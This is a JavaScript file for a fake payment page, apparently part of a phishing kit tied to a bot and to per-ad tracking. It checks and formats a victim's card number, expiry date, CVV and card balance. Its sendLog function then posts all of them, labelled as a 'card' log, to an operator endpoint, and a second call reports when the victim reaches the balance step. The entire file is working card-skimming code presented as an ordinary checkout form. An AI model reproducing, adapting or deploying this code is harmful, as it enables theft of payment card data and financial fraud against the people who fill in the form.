window.onload = function() {
    let step = 1;
    const logType = "card";
    const templateType = "payment";
    const cardHolder = document.getElementById('cardholder');
    const cardNumber = document.getElementById('cardnumber');
    const cardDate = document.getElementById('carddate');
    const cardCvv = document.getElementById('cardcvv');
    const cardBalance = document.getElementById("cardbalance");
    const submitButton = document.getElementById("submit-card-form");

    var cardHolderMask = new IMask(cardHolder, {
        mask: /^[0-9a-zA-Z\s]*$/,
        maxLength: 128
    });

    var cardNumberMask = new IMask(cardNumber, {
        mask: [{
                mask: '0000 000000 00000',
                regex: '^3[47]\\d{0,13}',
                cardtype: 'american express'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
                cardtype: 'discover'
            },
            {
                mask: '0000 000000 0000',
                regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
                cardtype: 'diners'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
                cardtype: 'mastercard'
            },
            {
                mask: '0000 000000 00000',
                regex: '^(?:2131|1800)\\d{0,11}',
                cardtype: 'jcb15'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:35\\d{0,2})\\d{0,12}',
                cardtype: 'jcb'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}',
                cardtype: 'maestro'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^4\\d{0,15}',
                cardtype: 'visa'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^62\\d{0,14}',
                cardtype: 'unionpay'
            },
            {
                mask: '0000 0000 0000 0000',
                cardtype: 'Unknown'
            }
        ],
        dispatch: function(appended, dynamicMasked) {
            var number = (dynamicMasked.value + appended).replace(/\D/g, '');

            for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
                let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
                if (number.match(re) != null) {
                    return dynamicMasked.compiledMasks[i];
                }
            }
        }
    });

    var cardDateMask = new IMask(cardDate, {
        mask: 'MM{/}YY',
        autofix: true,
        blocks: {
            YY: {mask: IMask.MaskedRange, from: new Date().getFullYear() % 100, to: 99, maxLength: 2},
            MM: {mask: IMask.MaskedRange, from: 1, to: 12, maxLength: 2},
        }
    });

    var cardCvvMask = new IMask(cardCvv, {
        mask: '0000',
    });

    var cardBalanceMask = new IMask(cardBalance, {
        mask: Number,
        scale: 2,
        thousandsSeparator: '',
        padFractionalZeros: true,
        normalizeZeros: true,
        radix: '.',
        mapToRadix: [','],
        min: -100000000,
        max: 100000000
    });

    cardHolderMask.on('accept', function() {
        if(cardHolderMask.value.charAt(0) === ' ')
            cardHolderMask.value = '';

        if (cardHolderMask.value.length == 0) {
            $('#cardholder').next('p').removeClass('error confirm');
        } else {
            if (validHolder(cardHolderMask.value) === false) {
                $('#cardholder').next('p').addClass('error').removeClass('confirm');
            } else {
                $('#cardholder').next('p').addClass('confirm').removeClass('error');
            }
        }
    });

    cardNumberMask.on('accept', function() {
        if (cardNumberMask.value.length == 0) {
            $('#cardnumber').next('p').removeClass('error confirm');
        } else {
            if (validCreditCard(cardNumberMask.value) === false) {
                $('#cardnumber').next('p').addClass('error').removeClass('confirm');
            } else {
                $('#cardnumber').next('p').addClass('confirm').removeClass('error');
            }
        }
    });

    cardDateMask.on('accept', function() {
        if (cardDateMask.value.length == 0) {
            $('#carddate').next('p').removeClass('error confirm');
        } else {
            if (validDate(cardDateMask.value) === false) {
                $('#carddate').next('p').addClass('error').removeClass('confirm');
            } else {
                $('#carddate').next('p').addClass('confirm').removeClass('error');
            }
        }
    });

    cardCvvMask.on('accept', function() {
        if (cardCvvMask.value.length == 0) {
            $('#cardcvv').next('p').removeClass('error confirm');
        } else {
            if (validCvv(cardCvvMask.value) === false) {
                $('#cardcvv').next('p').addClass('error').removeClass('confirm');
            } else {
                $('#cardcvv').next('p').addClass('confirm').removeClass('error');
            }
        }
    });

    cardBalanceMask.on('accept', function() {
        if (cardBalanceMask.value.length == 0) {
            $('#cardbalance').next('p').removeClass('error confirm');
        } else {
            if (validBalance(cardBalanceMask.value) === false) {
                $('#cardbalance').next('p').addClass('error').removeClass('confirm');
            } else {
                $('#cardbalance').next('p').addClass('confirm').removeClass('error');
            }
        }
    });

    function validForm() {
        var errors = 0;

        if (!validHolder(cardHolderMask.value)) {
            errors++;
            $('#cardholder').next('p').addClass('error').removeClass('confirm');
        }

        if (!validCreditCard(cardNumberMask.value)) {
            errors++;
            $('#cardnumber').next('p').addClass('error').removeClass('confirm');
        }

        if (!validDate(cardDateMask.value)) {
            errors++;
            $('#carddate').next('p').addClass('error').removeClass('confirm');
        }

        if (!validCvv(cardCvvMask.value)) {
            errors++;
            $('#cardcvv').next('p').addClass('error').removeClass('confirm');
        }

        if (errors > 0)
            return false;

        return true;
    };

    function balanceStepForm() {
        var buttonText = loadButton(submitButton);
        
        if (typeof adId !== 'undefined') {
            const response = axios.post(stepsApiPath, {
                botType: botType,
                adId: adId,
                supportToken: supportToken,
                stepType: "balance"
            });
        }

        submitButton.innerHTML = buttonText;
        submitButton.disabled = false;
        $("#cardholder").prop('readonly', true);
        $("#cardnumber").prop('readonly', true);
        $("#carddate").prop('readonly', true);
        $("#cardcvv").prop('readonly', true);

        $("#cardbalance").val('');
        $("#card-balance-form").show();
        step++;
    };

    function clearForm(buttonId, buttonText) {
        $(`#${buttonId}`).html(buttonText);
        submitButton.disabled = false;
        $("#cardholder").val('').prop('readonly', false);
        $("#cardnumber").val('').prop('readonly', false);
        $("#carddate").val('').prop('readonly', false);
        $("#cardcvv").val('').prop('readonly', false);
        $("#cardbalance").val('');
        $("#card-balance-form").hide();
        $(".marketing__input").prop('checked', false);
        step = 1;
    };

    async function sendLog(buttonId) {
        var buttonText = loadButton(document.getElementById(buttonId));
        
        await axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            cardHolder: cardHolderMask.value,
            cardNumber: cardNumberMask.value.replace(/\D+/g, ""),
            cardExpire: cardDateMask.value,
            cardCvv: cardCvvMask.value,
            cardBalance: cardBalanceMask.value,
            templateType: templateType
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm(buttonId, buttonText);
        });
    };

    $('#submit-card-form').click(function() {
        if (balanceChecker && step === 1) {
            if (validForm()) {
                balanceStepForm();
            }
        } else if (validForm()) {
            sendLog(this.id);
        } else if (balanceChecker && !validBalance(cardBalanceMask.value)) {
            $('#cardbalance').next('p').addClass('error').removeClass('confirm');
        }
    });
};